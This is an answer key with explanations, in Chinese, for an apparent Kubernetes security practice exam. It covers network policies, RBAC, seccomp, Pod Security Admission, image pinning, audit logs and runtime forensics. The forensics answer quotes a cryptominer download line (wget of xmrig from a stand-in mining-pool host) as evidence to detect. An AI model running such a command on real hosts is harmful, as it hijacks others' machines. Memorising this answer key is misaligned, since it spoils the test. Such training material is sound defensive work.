# 解析

提交后，只有没拿到满分的题目才会显示下面的解析。
正确答案不止一种 —— 评分看的是「结果是否符合要求」，以下只是最简洁的参考答案。

## Q1 NetworkPolicy —— 默认拒绝与选择性放行

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: deny-all, namespace: prod }
spec:
  podSelector: {}
  policyTypes: ["Ingress"]
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: allow-frontend, namespace: prod }
spec:
  podSelector: { matchLabels: { app: backend } }
  policyTypes: ["Ingress"]
  ingress:
    - from:
        - podSelector: { matchLabels: { app: frontend } }
      ports:
        - { protocol: TCP, port: 80 }
```

常见错误

- `podSelector: {}` 表示 **所有 Pod** —— 整个省略掉不是「没有 Pod」，而是 **语法错误**。
- NetworkPolicy 是 **叠加** 的 —— 即使有 deny-all，被任何一个 allow 策略匹配到的流量依然放行。
- 在 `from` 下面，把 `- podSelector` 和 `- namespaceSelector` 拆成两个条目是 OR；写在同一个条目里是 AND。

## Q2 TLS Secret 与 TLS Ingress

```bash
openssl req -x509 -newkey rsa:2048 -nodes -days 365 \
  -keyout web.key -out web.crt -subj "/CN=web.snacklab.local"
kubectl create secret tls web-cert -n prod --cert=web.crt --key=web.key
```

在 Ingress 的 `spec.tls` 里填入 `secretName: web-cert`，并把主机
`web.snacklab.local`、路径 `/`（Prefix）路由到 `web-svc:80`。

常见错误

- 用 `kubectl create secret generic` 创建出来的类型是 `Opaque`，会扣分。必须用 **`create secret tls`**。
- 只有规则、没有 `tls` 段的不是 TLS Ingress。

## Q3 校验平台二进制文件的完整性

```bash
cd ~/work/binaries && sha512sum -c checksums.txt
# kubelet: FAILED
echo kubelet > ~/answers/q3.txt
```

只要有一个二进制文件的校验和与发行方公布的值不同，这个文件就不可信。实际考试中
也会原样出现 `sha512sum`/`sha256sum -c` 的比对。

## Q4 把 RBAC 收紧到最小权限

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: { name: ci-role, namespace: apps }
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list"]
  - apiGroups: ["apps"]
    resources: ["deployments"]
    verbs: ["get", "list", "update"]
```

```bash
kubectl -n apps delete rolebinding ci-bot-rb
kubectl -n apps create rolebinding ci-bot-rb --role=ci-role --serviceaccount=apps:ci-bot
```

常见错误

- RoleBinding 的 `roleRef` 是 **不可变** 的 —— 要从 ClusterRole/admin 换成 Role/ci-role，只能删除后重建。
- 只写 `--resource=deployments` 会落到 core 组，应写 `deployments.apps`。
- 评分看的是 `auth can-i` 的结果 —— 如果 Secret 仍可读、Pod 仍可删，就要扣分。

## Q5 阻止 ServiceAccount 令牌自动挂载

```yaml
apiVersion: v1
kind: ServiceAccount
metadata: { name: web-sa, namespace: apps }
automountServiceAccountToken: false
```

```bash
kubectl -n apps patch deploy web -p '{"spec":{"template":{"spec":{"serviceAccountName":"web-sa"}}}}'
```

常见错误

- `automountServiceAccountToken` 是 ServiceAccount 的 **顶层字段**（不在 metadata，也不在 spec）。
- 只建了 SA 却没让 Deployment 指向它，挂载的仍是 default SA 的令牌。
- 在 Pod spec 里写 `automountServiceAccountToken: false` 也能达到同样效果（评分只看结果）。

## Q6 删除危险的 ClusterRoleBinding

```bash
kubectl get clusterrolebindings \
  -o custom-columns='NAME:.metadata.name,ROLE:.roleRef.name,SUBJECTS:.subjects[*].name' \
  | grep cluster-admin
echo debug-admin-binding > ~/answers/q6.txt
kubectl delete clusterrolebinding debug-admin-binding
```

常见错误

- 默认的 `cluster-admin` 绑定（subject `system:masters`）是集群运维所必需的 —— 删掉要扣分。
- 给 `system:authenticated` 授权意味着「只要能登录，谁都是管理员」。

## Q7 应用 seccomp RuntimeDefault

```bash
kubectl -n sys-hard patch deploy runner -p \
  '{"spec":{"template":{"spec":{"securityContext":{"seccompProfile":{"type":"RuntimeDefault"}}}}}}'
```

常见错误

- `seccompProfile` 在 **securityContext 里面**。放在 Pod 级别会应用到所有容器。
- `type: Localhost` 需要一个配置文件路径（`localhostProfile`），这里用的是 RuntimeDefault。

## Q8 移除主机访问

用 `kubectl -n sys-hard edit deploy node-tool` 删掉四项：
`securityContext.privileged`、`hostPID`、`hostNetwork`、`hostPath` 卷（连同它的 `volumeMounts`）。

常见错误

- 删了 hostPath 卷却 **留着它的 volumeMounts** 会让 spec 非法，导致滚动更新卡住。
- 用 edit/patch 比删除重建更快、更安全。

## Q9 用 SecurityContext 加固容器

```yaml
containers:
  - name: app
    image: busybox:1.36
    command: ["sh", "-c", "sleep 86400"]
    securityContext:
      runAsNonRoot: true
      runAsUser: 10001
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities: { drop: ["ALL"] }
```

常见错误

- `allowPrivilegeEscalation`、`capabilities`、`readOnlyRootFilesystem` **只能写在容器级别**。
- 只写 `runAsNonRoot: true` 而镜像默认以 root 运行，会报 `CreateContainerConfigError` —— 要同时给出 `runAsUser`。

## Q10 Pod Security Admission —— 强制 restricted

```bash
kubectl label ns restricted-ns pod-security.kubernetes.io/enforce=restricted
```

然后把 Deployment 改成符合 restricted：移除 `privileged`，
Pod 级别 `runAsNonRoot: true`、`runAsUser`、`seccompProfile: {type: RuntimeDefault}`，
容器级别 `allowPrivilegeEscalation: false`、`capabilities.drop: ["ALL"]`。

常见错误

- **标签只对新 Pod 生效。** 已有的 privileged Pod 会继续运行 —— 必须改 Deployment 并滚动更新。
- 如果滚动更新被 admission 拦住，`kubectl -n restricted-ns describe rs` 的事件里 **会原样写明哪里违规**，读它是最快的办法。

## Q11 处理 Secret

```bash
kubectl -n apps get secret db-creds -o jsonpath='{.data.password}' | base64 -d > ~/answers/q11.txt
kubectl -n apps create secret generic api-token --from-literal=token=cks-2026
```

Pod 用 `volumes[].secret.secretName: db-creds` 加上 `volumeMounts`（`mountPath: /etc/creds`、
`readOnly: true`）来使用。

常见错误

- `-o jsonpath` 取到的值仍是 **base64 编码** 的，不解码直接写就是错的。
- 用 `echo` 写文件时，不加引号写 `S3cr3t-CKS!` 可能触发 shell 历史扩展（`!`）—— 用单引号括起来。

## Q12 修复 Dockerfile 中的安全缺陷

```dockerfile
FROM nginx:1.26
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*
COPY index.html /usr/share/nginx/html/index.html
USER nginx
CMD ["nginx", "-g", "daemon off;"]
```

三处：`latest` → 固定标签；删除 `ENV API_KEY=…` 那行（凭据会永久留在镜像层里）；
把 `USER root` 换成非 root 用户。COPY 和 CMD 保持不变。

## Q13 识别并隔离有漏洞的镜像

报告中含 CRITICAL 的是 `frontend-app`（nginx:1.25，2 条）和 `report-app`（httpd:2.4，1 条）。
`batch-app`（busybox）只有 LOW，不要动它。

```bash
printf 'frontend-app\nreport-app\n' > ~/answers/q13.txt
kubectl -n supply scale deploy frontend-app report-app --replicas=0
```

实际考试中会直接运行 `trivy image --severity CRITICAL <镜像>` 得出同样的判断。

## Q14 用摘要固定镜像

```bash
kubectl -n supply get pod -l app=pinned \
  -o jsonpath='{.items[0].status.containerStatuses[0].imageID}'
# docker.io/library/nginx@sha256:abcd...
kubectl -n supply set image deploy/pinned web=nginx@sha256:abcd...
```

常见错误

- 像 `nginx:1.26@sha256:…` 这样连标签一起写也可以，但摘要写错会导致 ImagePullBackOff，卡在 Pod 的 Ready 评分上。
- 摘要不是随便的字符串，必须是 **真实存在的镜像的摘要**。

## Q15 API Server 审计日志

```yaml
# /var/lib/rancher/k3s/server/audit-policy.yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  - level: Metadata
    resources:
      - group: ""
        resources: ["secrets"]
  - level: None
```

```yaml
# /etc/rancher/k3s/config.yaml
kube-apiserver-arg:
  - audit-policy-file=/var/lib/rancher/k3s/server/audit-policy.yaml
  - audit-log-path=/var/lib/rancher/k3s/server/logs/audit.log
  - audit-log-maxage=7
  - audit-log-maxbackup=2
```

```bash
sudo mkdir -p /var/lib/rancher/k3s/server/logs
sudo systemctl restart k3s && kubectl get nodes   # 务必确认正常
```

常见错误

- 策略文件里第一条匹配的规则生效，**后面的规则不再评估** —— 把 `level: None` 放在最前面就什么都不记录了。
- `rules` 为空则所有请求都不记录。规则顺序：secrets → Metadata 在前，然后才是 None。
- 重启后 apiserver 起不来就是参数拼写错误 —— 用 `sudo journalctl -u k3s | tail` 查看，再修正 config.yaml。

## Q16 运行时取证

```bash
for p in $(kubectl -n runtime get pod -o name); do
  echo "== $p"; kubectl -n runtime exec ${p#pod/} -- ps
done
# 在 logshipper Pod 中：wget ... http://pool.minexmr.example/xmrig ...
echo logshipper > ~/answers/q16.txt
kubectl -n runtime scale deploy logshipper --replicas=0
```

常见错误

- 只看工作负载名字（`logshipper`）显得人畜无害 —— **进程列表** 才是证据：挖矿池域名和 `xmrig`。
- 只删 Pod，Deployment 会把它重建出来。**replicas 0** 才是隔离。
- 把无辜的 `web`、`metrics` 也停掉要扣分。隔离必须精准。
